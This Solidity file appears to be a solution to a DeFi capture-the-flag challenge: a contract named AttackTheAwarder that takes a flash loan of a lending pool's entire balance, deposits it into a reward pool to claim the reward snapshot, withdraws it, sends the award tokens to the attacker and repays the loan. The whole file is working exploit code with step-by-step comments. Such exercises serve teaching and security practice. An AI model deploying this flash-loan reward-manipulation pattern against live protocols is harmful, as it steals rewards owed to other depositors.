// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AwardToken.sol";
import "../DefiCtfToken.sol";
import "./AccountingToken.sol";

interface ITheAwarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract AttackTheAwarder {
    uint256 public constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 public constant USER_DEPOSIT = 100e18;

    address theAwarderPoolAddress;
    address flashLoanerPoolAddress;
    address attacker;

    DefiCtfToken liquidityToken;
    AwardToken immutable awardToken;

    constructor (address _theAwarderPoolAddress, address _flashLoanerPoolAddress, address _liquidityTokenAddress, address _awardTokenAddress) {
        theAwarderPoolAddress = _theAwarderPoolAddress;
        flashLoanerPoolAddress = _flashLoanerPoolAddress;
        liquidityToken = DefiCtfToken(_liquidityTokenAddress);
        awardToken = AwardToken(_awardTokenAddress);
        attacker = msg.sender;
    }

    function attack() public payable {
        // We get the loan for the total amount of tokens that are on the TheAwarderPoolAddress contract
        IFlashLoanerPool(flashLoanerPoolAddress).flashLoan(TOKENS_IN_LENDER_POOL);
    }

    // Function called on the FlashLoanerPool flashLoan function
    function receiveFlashLoan(uint256 amount) public {
        // First we approve the amount of liquidityTokens (DefiCtfToken) that we want to deposit
        liquidityToken.approve(address(theAwarderPoolAddress), amount);
        
        // Then we deposit the DefiCtfToken borrowed tokens into the TheAwarderPool contract
        ITheAwarderPool(theAwarderPoolAddress).deposit(amount);

        // Once that we have obtained the rewards we have to withdraw the liquidity tokens in order to be able to pay back the loan
        ITheAwarderPool(theAwarderPoolAddress).withdraw(amount);

        // Then we transfer the award tokens to the attacker address
        //awardToken.approve(address(this), awardToken.balanceOf(address(this)));
        awardToken.transfer(address(attacker), awardToken.balanceOf(address(this)));

        // At the end we return the flash loan
        liquidityToken.transfer(msg.sender, amount);
    }
}